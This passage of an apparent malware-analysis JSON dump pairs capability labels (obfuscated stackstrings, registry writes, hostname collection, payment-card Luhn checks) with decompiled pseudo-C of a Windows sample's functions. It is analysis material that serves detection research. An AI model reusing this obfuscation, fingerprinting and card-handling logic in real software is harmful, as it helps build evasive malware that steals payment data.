0;\n            var_10h = &var_54h - iVar5;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                puVar7 = ARG_0;\n                if (iVar2 != 0xe1c9de) {\n                    *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_4h) ^ (iVar6 + iVar5)[&var_54h - iVar5];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, iVar5, var_14h, var_28h, var_2ch);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar5 = var_1ch;\n            iVar2 = var_8h;\n            goto code_r0x004088dd;\n        }\n    }\n    puVar7 = NULL;\ncode_r0x004088dd:\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return puVar7;\n}\n",
        "token_count": 1721
    },
    "004089dc": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004089dc(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_21h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = 0x22163b7b;\n    var_28h._0_2_ = 0x7340;\n    var_8h = 6;\n    var_28h._2_1_ = 6;\n    stack0xffffffd7 = 0x54223318;\n    var_21h._0_1_ = 0x20;\n    var_21h._1_1_ = 0x41;\n    var_21h._2_2_ = 0x413b;\n    var_1ch = 0x4d414832;\n    var_18h._0_2_ = 0x4537;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    var_10h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar5 != 0x4eabf4) {\n            *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    var_2ch = 0x14202a1b;\n    var_28h._0_2_ = 0x3d36;\n    var_28h._2_1_ = 0x43;\n    stack0xffffffd7 = 0x3f1e7c7d;\n    var_21h._0_1_ = 0x3d;\n    var_21h._1_1_ = 0x70;\n    var_1ch = 0x7a524f70;\n    var_18h._0_2_ = 0x5153;\n    uVar3 = (*pcVar1)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        iVar5 = var_10h;\n        if (iVar6 != 0x3e5189) {\n            *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n    *0x41e210 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (*0x41e210 != NULL) {\n        iVar7 = (**0x41e210)(var_14h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar2 = var_4h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 995
    },
    "0040b100": {
        "rules": [
            "contain obfuscated stackstrings",
            "create or open registry key",
            "contain loop",
            "set registry value",
            "query or enumerate registry value",
            "get hostname"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040b100(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x41195c;\n    uStack104 = *0x411958;\n    uStack108 = *0x411954;\n    name = *0x411950;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41dd8c;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x411960;\n    uStack92 = *0x411964;\n    uStack88 = *0x411968;\n    uStack84 = *0x41196c;\n    var_3ch = *0x411940;\n    uStack60 = *0x411944;\n    uStack56 = *0x411948;\n    uStack52 = *0x41194c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(hKey);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x41dd94 = uVar10 ^ uVar8;\n        *0x41dd98 = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41dd8c = uVar8;\n        *0x41dd90 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1695
    },
    "0040b7aa": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040b7aa(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0x3d385a3f;\n    var_1ch = 0x1b5f081e;\n    var_18h = 0x4a1b0e3c;\n    var_14h._0_1_ = 0x4a;\n    var_10h = 0x494a3369;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x6b);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_8h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar5 != 0xbf5e10) {\n            var_4h = 5;\n            *(iVar7 + iVar4) = *(&var_10h + iVar7 % 5) ^ (iVar7 + iVar4)[&var_20h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_20h = 0x14202a1b;\n    var_1ch = 0x7d433d36;\n    var_18h = 0x3d3f1e7c;\n    var_14h._0_1_ = 0x70;\n    var_10h = 0x7a524f70;\n    var_ch._0_2_ = 0x5153;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_4h = &var_20h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        iVar5 = var_8h;\n        if (iVar6 != 0x3e5189) {\n            var_4h = 6;\n            *(iVar7 + iVar4) = *(&var_10h + iVar7 % 6) ^ (iVar7 + iVar4)[&var_20h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_8h);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 811
    },
    "0040ba4a": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040ba4a(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_50h;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3ah;\n    uint var_36h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x41da94;\n    var_18h = param_1;\n    if (*0x41ddac == NULL) {\n        var_10h = 6;\n        var_50h._0_1_ = 6;\n        stack0xffffffad = 0x4d000115;\n        var_4bh = 0x54171414;\n        var_47h = 0x192d3415;\n        var_43h = 0x3c654f41;\n        var_ch = 5;\n        var_3fh._0_1_ = 5;\n        stack0xffffffbe = 0x13351c64;\n        var_3ah = 0x251a5304;\n        var_36h = 0x79581913;\n        var_20h = 0x36767a51;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x79);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_14h = iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar4 != 0xecdeed) {\n                *(iVar7 + iVar3) = *(&var_20h + iVar7 % var_ch) ^ (iVar7 + iVar3)[&var_50h - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1e);\n        var_30h = 0x14202a1b;\n        var_2ch = 0x7d433d36;\n        var_28h = 0x3d3f1e7c;\n        var_24h._0_1_ = 0x70;\n        var_20h = 0x7a524f70;\n        var_1ch._0_2_ = 0x5153;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_ch = &var_30h - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetMessagePos)();\n            iVar4 = var_14h;\n            if (iVar5 != 0x3e5189) {\n                *(iVar7 + iVar3) = *(&var_20h + iVar7 % var_10h) ^ (iVar7 + iVar3)[&var_30h - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_14h);\n        *0x41ddac = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar1)(0, iVar4);\n        (*pcVar6)(uVar2);\n        pcVar6 = *0x41ddac;\n        if (*0x41ddac == NULL) goto code_r0x0040bbbe;\n    }\n    iVar3 = var_18h;\n    pcVar6 = (**0x41ddac)(var_18h);\n    if (pcVar6 != '\\0') {\n        *0x41da94 = iVar3 != 0;\n    }\ncode_r0x0040bbbe:\n    return pcVar6 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1131
    },
    "0040cd11": {
        "rules": [
            "contain obfuscated stackstrings",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040cd11(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar4;\n    code *pcVar5;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    int32_t hHeap;\n    \n    iVar4 = 8;\n    lpString2 = param_1;\n    hHeap = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, hHeap * 2 + 0x1a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (iVar2 != 0) {\n            var_8h = iVar2;\n            uVar1 = (*pcVar5)(8, hHeap * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar2, lpString2);\n                var_14h = fcn.0040d04b();\n                var_14h = var_14h + 2;\n                var_30h = 0x303c5768;\n                var_2ch = 0x5763723b;\n                var_28h = 0x722f3032;\n                var_24h = 0x30505739;\n                var_20h = 0x3050574d;\n                var_1ch._0_2_ = 0x724e;\n                uVar1 = (*pcVar5)(8, 0x21);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_18h = iVar2;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                    if (iVar3 != 0xbc4811) {\n                        var_10h = 6;\n                        *(iVar4 + iVar2) = *(&var_20h + iVar4 % 6) ^ (iVar4 + iVar2)[&var_30h - iVar2];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0x10);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_14h, iVar2, uVar1);\n                (*pcVar5)(hHeap, 0x4117c8, lpString2);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar4 = 8;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                if (lpString2 != 0) {\n                    var_10h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_78h = 0x1f0c392d;\n                    var_74h = 0x556d2e21;\n                    var_70h = 0x3e61681f;\n                    var_6ch = 0x6c204058;\n                    var_68h = 0x455c5d68;\n                    var_64h = 0x185d7746;\n                    var_60h = 0x1d294645;\n                    var_5ch = 0x68696801;\n                    var_58h = 0x25426049;\n                    var_54h._0_2_ = 0x582b;\n                    var_54h._2_1_ = 8;\n                    stack0xffffffab = 0xc3e2530;\n                    var_4dh = 0x7c696d4d;\n                    var_49h = 0x38270a58;\n                    var_45h = 0x3d485822;\n                    var_41h._0_2_ = 0x4741;\n                    var_41h._2_1_ = 0x1c;\n                    var_3dh = 0x5d686c24;\n                    var_39h = 0x4d46455d;\n                    var_20h = 0x6d784d4c;\n                    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x48);\n                    var_41h._3_1_ = var_54h._2_1_;\n                    uVar1 = (*pcVar5)(8, 0x44);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar4 = 0;\n                    var_14h = &var_78h - iVar3;\n                    do {\n                        iVar2 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                        if (iVar2 != 0x681e1b) {\n                            var_14h = 5;\n                            *(iVar4 + iVar3) = *(&var_20h + iVar4 % 5) ^ (iVar4 + iVar3)[&var_78h - iVar3];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0x43);\n                    uVar1 = var_10h;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar3, var_10h, var_10h);\n                    iVar4 = fcn.0040aa7f(nNumberOfBytesToWrite);\n                    iVar2 = var_18h;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.0040cb61(uVar1);\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                uVar1 = (*pcVar5)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                iVar2 = var_8h;\n            }\n            uVar1 = (*pcVar5)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 1748
    },
    "0040d1c1": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.0040d1c1(void)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint var_15h;\n    uchar *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_48h = 0x442c4534;\n    var_44h = 0x4e215527;\n    var_40h = 0x45334421;\n    var_3ch = 0x552c4429;\n    var_38h = 0x442e4e2c;\n    var_34h = 0x4422453e;\n    var_30h = 0x4e2b5529;\n    var_2ch = 0x4525442b;\n    var_28h = 0x5536443f;\n    var_24h = 0x44304e36;\n    var_20h._0_2_ = 0x4520;\n    var_20h._2_1_ = 0x38;\n    stack0xffffffdf = 0x3d553344;\n    var_19h = 0x2f443d4e;\n    var_15h._0_2_ = 0x4e45;\n    var_15h._2_1_ = 0x44;\n    var_10h = 0x444e4555;\n    var_ch._0_1_ = 0x44;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_48h - iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar5 != 0xd835a2) {\n            var_4h = 0x5;\n            *(iVar8 + iVar4) = *(&var_10h + iVar8 % 5) ^ (iVar8 + iVar4)[var_8h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x36);\n    uVar6 = fcn.0040d065();\n    puVar7 = uVar6 % 0x38 + 8;\n    var_10h = puVar7;\n    if (puVar7 != NULL) {\n        var_8h = puVar7 * 2 + 2;\n        uVar3 = (*pcVar1)(8, var_8h);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar2 = var_10h;\n        if (puVar7 != NULL) {\n            var_4h = NULL;\n            puVar9 = puVar7;\n            for (iVar8 = var_8h; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (var_10h != NULL) {\n                do {\n                    iVar8 = fcn.0040d065();\n                    *(puVar7 + var_4h * 2) = *(iVar4 + (iVar8 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < puVar2);\n            }\n            *(puVar7 + puVar2 * 2) = 0;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return puVar7;\n}\n",
        "token_count": 1008
    },
    "0040e3be": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040e3be(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_bch;\n    uint var_b8h;\n    int16_t *var_b4h;\n    int16_t *var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t hKey;\n    uint8_t *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint8_t var_24h;\n    ushort var_23h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    var_b8h = 0;\n    var_bch = 1;\n    var_34h = 0x5411532c;\n    var_30h = 0x7432682a;\n    var_2ch = 0x53044c21;\n    var_28h._0_2_ = 0x5400;\n    var_38h = 5;\n    var_28h._2_1_ = 5;\n    var_28h._3_1_ = 0x68;\n    var_24h = 0x3d;\n    var_23h = 0x2774;\n    var_21h._0_1_ = 0x4c;\n    var_21h._1_1_ = 0x1c;\n    var_21h._2_2_ = 0x1553;\n    var_1dh._0_1_ = 0x54;\n    var_1dh._1_1_ = 0x20;\n    var_1dh._2_2_ = 0x3f68;\n    var_19h._0_1_ = 0x74;\n    var_19h._1_1_ = 0x54;\n    var_19h._2_1_ = 0x4c;\n    var_44h = 0x54745368;\n    var_40h._0_1_ = 0x4c;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_b0h = piVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar5 != 0x3ccf5c) {\n            *(iVar8 + piVar4) = *(&var_44h + iVar8 % var_38h) ^ (iVar8 + piVar4)[&var_34h - piVar4];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1e);\n    var_ach = 0x7829553e;\n    var_a8h = 0x46216d2f;\n    var_a4h = 0x550c490f;\n    var_a0h = 0x6d2c7834;\n    var_9ch = 0x49354609;\n    var_98h = 0x78255504;\n    var_94h = 0x463a6d3b;\n    var_90h = 0x5502490b;\n    var_8ch = 0x6d3d7820;\n    var_88h = 0x49314609;\n    var_84h = 0x78075528;\n    var_80h = 0x46096d02;\n    var_7ch = 0x551f493f;\n    var_78h = 0x6d3c7829;\n    var_74h = 0x49284625;\n    var_70h = 0x782a5502;\n    var_6ch = 0x46366d20;\n    var_68h = 0x55314901;\n    var_64h = 0x6d2c7816;\n    var_60h = 0x491c463b;\n    var_5ch = 0x78285504;\n    var_58h = 0x46126d2e;\n    var_54h = 0x55224928;\n    var_50h = 0x6d497835;\n    var_8h = 0x7846556d;\n    var_4h._0_1_ = 0x49;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_44h = iVar8;\n    var_3ch = &var_ach - iVar8;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar6 != 0xa2ec3e) {\n            *(iVar5 + iVar8) = *(&var_8h + iVar5 % var_38h) ^ (iVar5 + iVar8)[&var_ach - iVar8];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x60);\n    hKey = fcn.0040f998(0x20006);\n    pcVar7 